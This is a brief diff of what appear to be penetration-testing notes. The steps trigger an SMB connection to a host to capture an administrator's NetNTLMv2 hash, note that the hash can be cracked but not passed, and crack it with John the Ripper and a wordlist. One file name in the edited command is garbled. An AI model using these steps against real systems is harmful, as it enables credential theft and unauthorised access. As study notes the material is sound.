@@ -49,7 +49,8 @@ shell
 powershell
 dir \\192.168.10.50\test
 
-get ntlm hash of administrator
+get ntlmv2 hash of administrator
+can crack ntlmv2 but not for pth
 
-john --format=netntlmv2 --wordlist=wordlist ntlm
+john --format=netntlmv2 --wordlist=wordlist ntlmvé 
 
